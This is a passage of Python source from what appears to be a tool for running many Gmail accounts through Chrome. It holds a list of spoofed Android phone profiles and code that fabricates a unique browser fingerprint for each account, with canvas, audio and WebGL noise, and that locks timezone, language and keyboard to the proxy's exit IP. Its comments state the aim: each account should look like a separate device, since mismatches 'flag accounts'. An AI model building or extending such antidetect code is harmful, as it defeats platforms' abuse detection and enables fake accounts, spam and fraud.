        "model": "A065",          "androidVersion": "14",   # Nothing Phone 2
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 730",
    },
    {
        "model": "XT2303-2",      "androidVersion": "14",   # Motorola Edge 40
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G77 MC9",
    },
    {
        "model": "V2246",         "androidVersion": "14",   # Vivo V29
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 642L",
    },
    {
        "model": "PGEM10",        "androidVersion": "14",   # Oppo Find X6
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MC11",
    },
    # ── Google Pixel (additional) ─────────────────────────────────────────────
    {
        "model": "Pixel 9 Pro XL", "androidVersion": "15",  # Tensor G4
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 932, "availH": 908, "dpr": 2.625,
        "hwConcurrency": 9, "deviceMemory": 16, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MP7",
    },
    # ── Samsung Galaxy S-series (additional) ──────────────────────────────────
    {
        "model": "SM-S921B",      "androidVersion": "14",   # Samsung Galaxy S24 (Exynos 2400)
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 10, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 940",
    },
    {
        "model": "SM-S928B",      "androidVersion": "14",   # Samsung Galaxy S24 Ultra
        "chromeVersion": "138.0.7204.100",
        "screenW": 384, "screenH": 854, "availH": 830, "dpr": 3.0,
        "hwConcurrency": 12, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    {
        "model": "SM-S931B",      "androidVersion": "15",   # Samsung Galaxy S25
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 830",
    },
    # ── Samsung Galaxy A-series (additional) ──────────────────────────────────
    {
        "model": "SM-A556B",      "androidVersion": "14",   # Samsung Galaxy A55 (Exynos 1480)
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 2.625,
        "hwConcurrency": 8,  "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 530",
    },
    # ── OnePlus (additional) ──────────────────────────────────────────────────
    {
        "model": "CPH2655",       "androidVersion": "15",   # OnePlus 13
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8,  "deviceMemory": 16, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 830",
    },
    # ── Xiaomi / Redmi (additional) ───────────────────────────────────────────
    {
        "model": "24030PN60G",    "androidVersion": "14",   # Xiaomi 14 Ultra
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 16, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    {
        "model": "23127PN0CG",    "androidVersion": "14",   # Xiaomi 14T Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Immortalis-G720 MC12",
    },
    {
        "model": "23013PC75G",    "androidVersion": "13",   # Redmi Note 13 Pro+
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G610 MC4",
    },
    # ── Others (additional) ───────────────────────────────────────────────────
    {
        "model": "AI2401",        "androidVersion": "14",   # ASUS ROG Phone 8
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    {
        "model": "XT2403-3",      "androidVersion": "14",   # Motorola Edge 50 Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 720",
    },
    {
        "model": "XQ-EC54",       "androidVersion": "14",   # Sony Xperia 1 VI
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    # ── Samsung Galaxy S-series (additional) ──────────────────────────────────
    {
        "model": "SM-S936B",      "androidVersion": "15",   # Samsung Galaxy S25+
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 830",
    },
    {
        "model": "SM-S938B",      "androidVersion": "15",   # Samsung Galaxy S25 Ultra
        "chromeVersion": "138.0.7204.100",
        "screenW": 384, "screenH": 854, "availH": 830, "dpr": 3.0,
        "hwConcurrency": 8,  "deviceMemory": 16, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 830",
    },
    # ── Google Pixel (additional) ─────────────────────────────────────────────
    {
        "model": "Pixel 8a",      "androidVersion": "14",   # Tensor G3
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8,  "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    # ── OnePlus (additional) ──────────────────────────────────────────────────
    {
        "model": "CPH2609",       "androidVersion": "14",   # OnePlus Nord 4
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8,  "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 735",
    },
    # ── Xiaomi (additional) ───────────────────────────────────────────────────
    {
        "model": "24129PN74G",    "androidVersion": "15",   # Xiaomi 15
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 16, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 830",
    },
    {
        "model": "24117RA73G",    "androidVersion": "14",   # Redmi Note 14 Pro+
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 720",
    },
    # ── Others (additional) ───────────────────────────────────────────────────
    {
        "model": "A142",          "androidVersion": "14",   # Nothing Phone (2a)
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8,  "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G610 MC4",
    },
    {
        "model": "RMX3851",       "androidVersion": "14",   # Realme GT 6
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 735",
    },
    {
        "model": "CPH2629",       "androidVersion": "14",   # Oppo Reno 12 Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Immortalis-G720 MC12",
    },
    {
        "model": "V2324A",        "androidVersion": "14",   # vivo X100 Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8,  "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Immortalis-G720 MC12",
    },
]

# Device Check writes its last generated fingerprint here. Browser Check reads
# this same-device snapshot when the matching profile is selected, so the
# visible audit and Gmail browser receive identical device signals.
DEVICE_FINGERPRINT_SNAPSHOT_PATH = "/tmp/vanguard-mx-device-fingerprint.json"


# ── Country code → Accept-Language mapping ────────────────────────────────────
_COUNTRY_LANG: dict[str, str] = {
    # English-primary
    "US": "en-US", "CA": "en-CA", "GB": "en-GB", "AU": "en-AU",
    "NZ": "en-NZ", "IE": "en-GB", "IN": "en-IN", "PK": "en-US",
    "NG": "en-US", "GH": "en-US", "ZA": "en-ZA", "SG": "en-SG",
    "PH": "en-PH", "MY": "en-MY", "BD": "en-US", "LK": "en-US",
    "KE": "en-US", "UG": "en-US", "TZ": "en-US",
    # European
    "DE": "de-DE", "AT": "de-AT", "CH": "de-CH",
    "FR": "fr-FR", "BE": "fr-BE",
    "ES": "es-ES",
    "IT": "it-IT",
    "PT": "pt-PT",
    "NL": "nl-NL",
    "PL": "pl-PL",
    "RU": "ru-RU",
    "TR": "tr-TR",
    "SE": "sv-SE", "NO": "nb-NO", "DK": "da-DK", "FI": "fi-FI",
    "CZ": "cs-CZ", "SK": "sk-SK", "RO": "ro-RO", "HU": "hu-HU",
    "GR": "el-GR", "UA": "uk-UA", "HR": "hr-HR", "BG": "bg-BG",
    # Latin America
    "MX": "es-MX", "AR": "es-AR", "CO": "es-CO", "CL": "es-CL",
    "PE": "es-PE", "VE": "es-VE", "BR": "pt-BR",
    # Asia-Pacific
    "JP": "ja-JP", "KR": "ko-KR",
    "CN": "zh-CN", "TW": "zh-TW", "HK": "zh-HK",
    "TH": "th-TH", "VN": "vi-VN", "ID": "id-ID",
    # Middle East / Africa
    "SA": "ar-SA", "AE": "ar-AE", "EG": "ar-EG", "MA": "ar-MA",
    "IQ": "ar-IQ", "JO": "ar-JO", "KW": "ar-KW",
    "IL": "he-IL",
}

_RANDOM_TIMEZONES = [
    "America/New_York", "America/Chicago", "America/Los_Angeles",
    "America/Denver", "America/Toronto", "America/Vancouver",
    "Europe/London", "Europe/Paris", "Europe/Berlin", "Europe/Madrid",
    "Europe/Rome", "Europe/Amsterdam", "Europe/Warsaw",
    "Asia/Calcutta", "Asia/Tokyo", "Asia/Seoul", "Asia/Singapore",
    "Asia/Dubai", "Asia/Bangkok", "Asia/Jakarta", "Asia/Hong_Kong",
    "Australia/Sydney", "Australia/Melbourne",
]


def geo_lookup_proxy(proxy_url: str, _label: str = "", _retries: int = 3) -> dict | None:
    """Fetch exit IP geo info through the proxy. Tries three services in order per attempt:
      1. ip-api.com  (HTTP, comprehensive)
      2. ipwho.is    (HTTPS fallback, comprehensive)
      3. ipinfo.io   (HTTPS fallback, minimal)
    Returns timezone/language/geo fields (for fingerprint) + full IP info (for display).
    Retries up to _retries times (2 s sleep between) across all services.
    Geo-lock MUST succeed — timezone/language mismatch flags accounts."""
    import time as _time
    import requests as req

    tag = f"[geo{(' ' + _label) if _label else ''}]"

    # Parse + re-encode proxy URL once — proxy usernames can contain + and other special
    # chars that Python's urllib mis-handles. We parse manually and re-encode each part.
    try:
        # Force http:// and encode '+' in the username. urllib3 treats a raw
        # '+' as a space and ProxyScrape then closes the connection.
        _safe_proxy = requests_proxy_url(proxy_url)
        proxies = {"http": _safe_proxy, "https": _safe_proxy}
    except Exception as _parse_err:
        log(f"{tag} Failed to parse proxy URL: {_parse_err}")
        return None

    def _build_result(ip, tz, cc, lat, lon, city=None, region=None, country=None,
                      continent=None, continentCode=None, isp=None, org=None,
                      asn=None, zip_=None, district=None, reverse=None,
                      currency=None, offset=None, mobile=None, proxy_flag=None, hosting=None):
        lg = _COUNTRY_LANG.get(cc, "en-US")
        log(f"{tag} Got IP {ip} — {city}, {cc} / {isp or org or 'unknown ISP'}")
        return {
            "timezone": tz or random.choice(_RANDOM_TIMEZONES),
            "language": lg, "countryCode": cc,
            "lat": float(lat or 39.8283), "lon": float(lon or -98.5795),
            "ip": ip, "city": city, "district": district, "zip": zip_,
            "region": region, "country": country,
            "continent": continent, "continentCode": continentCode,
            "isp": isp, "org": org, "as": asn,
            "reverse": reverse, "currency": currency, "offset": offset,
            "mobile": mobile, "proxy": proxy_flag, "hosting": hosting,
        }

    for _attempt in range(1, _retries + 1):
        # ── Service 1: ip-api.com (HTTP, most comprehensive) ─────────────────
        try:
            log(f"{tag} [1/3] ip-api.com attempt {_attempt}/{_retries}")
            r = req.get(
                "http://ip-api.com/json?fields=status,query,country,countryCode,continent,"
                "continentCode,regionName,city,district,zip,isp,org,as,asname,mobile,proxy,"
                "hosting,reverse,currency,offset,timezone,lat,lon",
                proxies=proxies, timeout=15
            )
            d = r.json()
            if d.get("status") == "success":
                return _build_result(
                    ip=d.get("query"), tz=d.get("timezone"), cc=d.get("countryCode", "US"),
                    lat=d.get("lat"), lon=d.get("lon"), city=d.get("city"),
                    region=d.get("regionName"), country=d.get("country"),
                    continent=d.get("continent"), continentCode=d.get("continentCode"),
                    isp=d.get("isp"), org=d.get("org"), asn=d.get("as"),
                    zip_=d.get("zip"), district=d.get("district"), reverse=d.get("reverse"),
                    currency=d.get("currency"), offset=d.get("offset"),
                    mobile=d.get("mobile"), proxy_flag=d.get("proxy"), hosting=d.get("hosting"),
                )
            log(f"{tag} ip-api.com non-success: {d.get('message', d)}")
        except Exception as _e1:
            log(f"{tag} ip-api.com failed: {_e1}")

        # ── Service 2: ipwho.is (HTTP fallback, comprehensive) ───────────────
        try:
            log(f"{tag} [2/3] ipwho.is attempt {_attempt}/{_retries}")
            r2 = req.get("http://ipwho.is/", proxies=proxies, timeout=15)
            d2 = r2.json()
            if d2.get("success"):
                tz2  = (d2.get("timezone") or {}).get("id") or d2.get("timezone")
                off2 = (d2.get("timezone") or {}).get("offset")
                con2 = d2.get("connection") or {}
                return _build_result(
                    ip=d2.get("ip"), tz=tz2, cc=d2.get("country_code", "US"),
                    lat=d2.get("latitude"), lon=d2.get("longitude"),
                    city=d2.get("city"), region=d2.get("region"),
                    country=d2.get("country"), zip_=d2.get("postal"),
                    isp=con2.get("isp"), org=con2.get("org"),
                    asn=f"AS{con2['asn']}" if con2.get("asn") else None,
                    offset=off2,
                )
            log(f"{tag} ipwho.is non-success: {d2.get('message', d2)}")
        except Exception as _e2:
            log(f"{tag} ipwho.is failed: {_e2}")

        # ── Service 3: ipinfo.io (HTTP, minimal but very reliable) ──────────
        try:
            log(f"{tag} [3/3] ipinfo.io attempt {_attempt}/{_retries}")
            r3 = req.get("http://ipinfo.io/json", proxies=proxies, timeout=15)
            d3 = r3.json()
            if d3.get("ip") and not d3.get("bogon"):
                cc3  = d3.get("country", "US")
                tz3  = d3.get("timezone")
                loc3 = d3.get("loc", "39.8283,-98.5795").split(",")
                lat3 = float(loc3[0]) if len(loc3) == 2 else 39.8283
                lon3 = float(loc3[1]) if len(loc3) == 2 else -98.5795
                org3 = d3.get("org")  # e.g. "AS7922 Comcast Cable"
                return _build_result(
                    ip=d3.get("ip"), tz=tz3, cc=cc3, lat=lat3, lon=lon3,
                    city=d3.get("city"), region=d3.get("region"),
                    country=d3.get("country"), zip_=d3.get("postal"),
                    org=org3, asn=org3.split(" ")[0] if org3 else None,
                )
            log(f"{tag} ipinfo.io returned bogon/empty: {d3}")
        except Exception as _e3:
            log(f"{tag} ipinfo.io failed: {_e3}")

        if _attempt < _retries:
            log(f"{tag} All 3 services failed on attempt {_attempt}/{_retries}, retrying in 3s…")
            _time.sleep(3)

    log(f"{tag} ⚠️ GEO LOCK FAILED after {_retries} attempts (all 3 services) — timezone/language mismatch risk!")
    return None


def _proxy_country_hint(proxy_url: str) -> str:
    """Extract the intended country code from a proxy URL's username field.
    Supports formats like: username-country-us-session-xxx  →  'US'
                            username-country-in-session-xxx  →  'IN'
    Returns '' if no country hint found."""
    try:
        from urllib.parse import urlparse
        import re as _re2
        _u = urlparse(proxy_url).username or ""
        _m = _re2.search(r'country[-_]([a-z]{2})', _u.lower())
        if _m:
            return _m.group(1).upper()
    except Exception:
        pass
    return ""


# Language tag → XKB layout. This is the keyboard a phone in that locale uses.
_KEYBOARD_BY_LANG: dict[str, str] = {
    "en-us": "us", "en-gb": "gb", "en-ca": "ca", "en-au": "us", "en-nz": "us",
    "en-in": "in", "en-za": "za", "en-sg": "us", "en-ph": "us", "en-ie": "ie",
    "de-de": "de", "de-at": "de", "de-ch": "ch",
    "fr-fr": "fr", "fr-be": "be",
    "es-es": "es", "es-mx": "latam", "es-ar": "latam", "es-co": "latam",
    "es-cl": "latam", "es-pe": "latam", "es-ve": "latam",
    "pt-br": "br", "pt-pt": "pt",
    "it-it": "it", "nl-nl": "nl", "pl-pl": "pl", "ru-ru": "ru", "tr-tr": "tr",
    "sv-se": "se", "nb-no": "no", "da-dk": "dk", "fi-fi": "fi",
    "cs-cz": "cz", "sk-sk": "sk", "ro-ro": "ro", "hu-hu": "hu",
    "el-gr": "gr", "uk-ua": "ua", "hr-hr": "hr", "bg-bg": "bg",
    "ja-jp": "jp", "ko-kr": "kr", "zh-cn": "cn", "zh-tw": "tw", "zh-hk": "cn",
    "th-th": "th", "vi-vn": "vn", "id-id": "id",
    "ar-sa": "ara", "ar-ae": "ara", "ar-eg": "ara", "ar-ma": "ara",
    "ar-iq": "ara", "ar-jo": "ara", "ar-kw": "ara",
    "he-il": "il",
}
_KEYBOARD_BY_PRIMARY: dict[str, str] = {
    "en": "us", "de": "de", "fr": "fr", "es": "es", "pt": "pt", "it": "it",
    "nl": "nl", "pl": "pl", "ru": "ru", "tr": "tr", "ja": "jp", "ko": "kr",
    "zh": "cn", "ar": "ara", "th": "th", "vi": "vn", "id": "id",
}


def keyboard_layout_for_language(language: str) -> str:
    """XKB layout that belongs with this Accept-Language tag."""
    lang = (language or "en-US").strip().lower().replace("_", "-")
    if lang in _KEYBOARD_BY_LANG:
        return _KEYBOARD_BY_LANG[lang]
    return _KEYBOARD_BY_PRIMARY.get(lang.split("-")[0], "us")


def accept_language_for(language: str) -> str:
    """Accept-Language header for a locale, e.g. en-US → 'en-US,en;q=0.9'."""
    language = (language or "en-US").strip()
    primary = language.split("-")[0]
    if primary.lower() == language.lower():
        return language
    return f"{language},{primary};q=0.9"


def geo_lookup_ip(ip: str) -> dict | None:
    """Describe one known exit IP.

    The lookup is direct, not through the proxy, so a rotating gateway cannot
    answer with a different address than the one Chrome already used.
    """
    ip = (ip or "").strip()
    if not ip or not ip[0].isdigit():
        return None
    import requests as req
    try:
        r = req.get(
            "http://ip-api.com/json/"
            f"{ip}?fields=status,query,country,countryCode,regionName,city,"
            "timezone,lat,lon,isp,org,as,mobile,proxy,hosting",
            timeout=12,
        )
        d = r.json()
        if d.get("status") != "success" or not d.get("timezone"):
            log(f"[geo ip] no timezone for {ip}: {d.get('message', d)}")
            return None
        cc = d.get("countryCode") or "US"
        language = _COUNTRY_LANG.get(cc, "en-US")
        return {
            "timezone": d.get("timezone"),
            "language": language,
            "countryCode": cc,
            "lat": float(d.get("lat") or 0),
            "lon": float(d.get("lon") or 0),
            "ip": d.get("query") or ip,
            "city": d.get("city"),
            "region": d.get("regionName"),
            "country": d.get("country"),
            "isp": d.get("isp"),
            "org": d.get("org"),
            "as": d.get("as"),
            "mobile": d.get("mobile"),
            "proxy": d.get("proxy"),
            "hosting": d.get("hosting"),
            "keyboard": keyboard_layout_for_language(language),
        }
    except Exception as e:
        log(f"[geo ip] lookup failed for {ip}: {e}")
        return None


def apply_keyboard_layout(layout: str, display: str | None = None) -> bool:
    """Point the virtual display's keyboard at the exit IP's locale."""
    layout = (layout or "").strip()
    if not layout:
        return False
    disp = display or os.environ.get("DISPLAY") or ""
    cmd = ["setxkbmap", "-layout", layout]
    if disp:
        cmd[1:1] = ["-display", disp]
    try:
        proc = subprocess.run(cmd, check=False, timeout=5, capture_output=True, text=True)
        if proc.returncode != 0:
            detail = (proc.stderr or proc.stdout or "").strip()
            log(f"Keyboard layout {layout} not applied: {detail[:160]}")
            return False
        log(f"Keyboard layout set → {layout}")
        return True
    except FileNotFoundError:
        log("Keyboard layout skipped — setxkbmap is not installed")
        return False
    except Exception as e:
        log(f"Keyboard layout skipped ({layout}): {e}")
        return False


def read_browser_exit_ip(driver) -> str | None:
    """Read the IP Chrome itself is using. A separate requests call can rotate."""
    try:
        driver.set_page_load_timeout(25)
        driver.get("https://api.ipify.org?format=json")
        body = driver.execute_script("return document.body && document.body.innerText || ''") or ""
        ip = json.loads(body).get("ip")
        return ip or None
    except Exception as e:
        log(f"Chrome exit IP read failed: {e}")
        return None
    finally:
        try:
            driver.set_page_load_timeout(180)
        except Exception:
            pass


def lock_fingerprint_to_exit_ip(fp: dict, ip: str | None) -> dict:
    """Overwrite locale fields so they describe this exact exit IP."""
    live = geo_lookup_ip(ip or "")
    if not live:
        fp["keyboard"] = keyboard_layout_for_language(fp.get("language") or "en-US")
        return fp
    for key, value in live.items():
        if value is not None:
            fp[key] = value
    fp["geoLocked"] = True
    fp["keyboard"] = live.get("keyboard") or keyboard_layout_for_language(fp.get("language") or "en-US")
    log(
        f"LOCALE_LOCK ip={fp.get('ip')} tz={fp.get('timezone')} "
        f"lang={fp.get('language')} keyboard={fp.get('keyboard')} cc={fp.get('countryCode')}"
    )
    return fp


def get_or_create_fingerprint(
    profile_dir: str,
    proxy: str | None = None,
    device_index: int | None = None,
    reuse_device_snapshot: bool = True,
) -> dict:
    """Load the saved fingerprint for this profile, or generate & save a new one.
    This makes every account look like a consistent, unique device — same as
    antidetect/cloner behaviour.
    If proxy is given and geo-lookup hasn't run yet, timezone + language are
    derived from the proxy's exit IP (so they match the IP location).
    Session 45: also re-locks when the proxy's country hint (e.g. -country-us-)
    doesn't match the cached countryCode — fixes stale timezones after proxy switch."""
    fp_path = os.path.join(profile_dir, "fingerprint.json")
    selected_profile = None
    if device_index is not None and 0 <= device_index < len(PHONE_PROFILES):
        selected_profile = PHONE_PROFILES[device_index]

    # Prefer the exact fingerprint most recently generated by Device Check.
    # This is intentionally a local, non-secret snapshot containing only device
    # signals; Gmail credentials and proxy URLs are never written here.
    if selected_profile is not None and reuse_device_snapshot:
        try:
            with open(DEVICE_FINGERPRINT_SNAPSHOT_PATH, "r") as f:
                device_snapshot = json.load(f)
            if (
                device_snapshot.get("deviceIndex") == device_index
                and all(k in device_snapshot for k in (
                    "model", "screenW", "screenH", "dpr", "canvasSeed",
                    "audioNoise", "webglNoise", "timezone", "language",
                ))
            ):
                device_snapshot["deviceIndex"] = device_index
                try:
                    os.makedirs(profile_dir, exist_ok=True)
                    with open(fp_path, "w") as f:
                        json.dump(device_snapshot, f, indent=2)
                except Exception:
                    pass
                log(
                    f"[fingerprint] Reusing exact Device Check snapshot → "
                    f"{device_snapshot['model']} | canvas={device_snapshot['canvasSeed']}"
                )
                return device_snapshot
        except (FileNotFoundError, ValueError, OSError):
            pass

    if os.path.exists(fp_path):
        try:
            with open(fp_path, "r") as f:
                existing = json.load(f)
            if all(k in existing for k in ("model", "screenW", "canvasSeed")):
                # Browser Check and Device Check must use the same selected
                # PHONE_PROFILES entry. Keep the account's stable per-profile
                # noise/geo values, but replace the device identity when the
                # user selects a different device.
                if selected_profile and existing.get("deviceIndex") != device_index:
                    existing = selected_profile.copy()
                    existing["deviceIndex"] = device_index
                    existing["canvasSeed"] = random.randint(1, 254)
                    existing["audioNoise"] = round(random.uniform(0.00001, 0.00009), 7)
                    existing["webglNoise"] = round(random.uniform(0.000001, 0.000009), 8)
                    existing["geoLocked"] = False
                    try:
                        with open(fp_path, "w") as f:
                            json.dump(existing, f, indent=2)
                    except Exception:
                        pass
                elif selected_profile:
                    # Older profiles may not have deviceIndex. Align the
                    # persisted record to the chosen base profile without
                    # regenerating its stable fingerprint noise.
                    for key in (
                        "model", "androidVersion", "chromeVersion", "screenW",
                        "screenH", "availH", "dpr", "hwConcurrency",
                        "deviceMemory", "maxTouchPoints", "platform",
                        "webglVendor", "webglRenderer",
                    ):
                        existing[key] = selected_profile[key]
                    existing["deviceIndex"] = device_index
                # Detect proxy country mismatch — user switched from e.g. India proxy
                # to US proxy but cached fingerprint still has Indian timezone.
                _hint   = _proxy_country_hint(proxy) if proxy else ""
                _cached = existing.get("countryCode", "")
                _country_mismatch = bool(_hint and _cached and _hint != _cached)
                if _country_mismatch:
                    log(f"[fingerprint] Proxy country hint ({_hint}) ≠ cached countryCode ({_cached}) — forcing geo re-lock")

                # If proxy is provided and geo hasn't been locked yet — OR geo was locked
                # but ip field is missing (old fingerprint from before Session 29) —
                # OR proxy country changed → re-lock now
                _needs_geo = proxy and (
                    not existing.get("geoLocked")
                    or (existing.get("geoLocked") and not existing.get("ip"))
                    or _country_mismatch
                )
                if _needs_geo:
                    geo = geo_lookup_proxy(proxy, _label="fingerprint-update")
                    if geo:
                        existing["timezone"]    = geo["timezone"]
                        existing["language"]    = geo["language"]
                        existing["countryCode"] = geo["countryCode"]
                        existing["geoLocked"]   = True
                        for _k in ("ip","city","district","zip","region","country","continent","continentCode","isp","org","as","asname","reverse","currency","offset","mobile","proxy","hosting"):
                            if geo.get(_k) is not None:
                                existing[_k] = geo[_k]
                        try:
                            with open(fp_path, "w") as f:
                                json.dump(existing, f, indent=2)
                        except Exception:
                            pass
                if reuse_device_snapshot:
                    _remember_shared_fingerprint(existing, device_index)
                return existing
        except Exception:
            pass
    fp = (selected_profile.copy() if selected_profile else random.choice(PHONE_PROFILES).copy())
    if device_index is not None:
        fp["deviceIndex"] = device_index
    fp["canvasSeed"]  = random.randint(1, 254)        # unique canvas XOR per account
    fp["audioNoise"]  = round(random.uniform(0.00001, 0.00009), 7)  # unique audio shift
    # Timezone + language — from proxy exit IP if available, else random
    if proxy:
        geo = geo_lookup_proxy(proxy)
    else:
        geo = None
    if geo:
        fp["timezone"]    = geo["timezone"]
        fp["language"]    = geo["language"]
        fp["countryCode"] = geo["countryCode"]
        fp["lat"]         = geo.get("lat", 39.8283)
        fp["lon"]         = geo.get("lon", -98.5795)
        fp["geoLocked"]   = True
        for _k in ("ip","city","district","zip","region","country","continent","continentCode","isp","org","as","asname","reverse","currency","offset","mobile","proxy","hosting"):
            if geo.get(_k) is not None:
                fp[_k] = geo[_k]
    else:
        fp["geoLocked"] = False
        fp["lat"]       = 37.7749   # San Francisco fallback
        fp["lon"]       = -122.4194
        # Session 46: If proxy has a US country hint, restrict fallback to US timezones
        # so geo-lock failures don't produce obviously wrong non-American timestamps.
        _hint_cc = _proxy_country_hint(proxy) if proxy else ""
        if _hint_cc == "US":
            fp["timezone"] = random.choice([
                "America/New_York", "America/Chicago", "America/Los_Angeles",
                "America/Denver", "America/Phoenix", "America/Anchorage",
                "America/Toronto", "America/Vancouver",
            ])
            fp["language"] = random.choice(["en-US", "en-US", "en-US", "en-CA"])
        else:
            fp["timezone"] = random.choice(_RANDOM_TIMEZONES)
            fp["language"] = random.choice([
                "en-US", "en-US", "en-US", "en-US",  # weighted — most users are en-US
                "en-GB", "en-CA", "en-AU", "en-IN",
            ])
    # Timezone + language come from geo_lookup_proxy (if proxy provided) or random fallback above.
    # Do NOT override here — let the proxy exit IP determine the locale so Chrome fingerprint
    # matches the IP location (US proxy → America/New_York + en-US, etc.).
    # ── App-cloner style: every account has its own unique device identity ────
    # Battery — real phones vary; always discharging (mobile check, plugged-in is rare)
    fp["batteryLevel"]    = round(random.uniform(0.15, 0.94), 2)
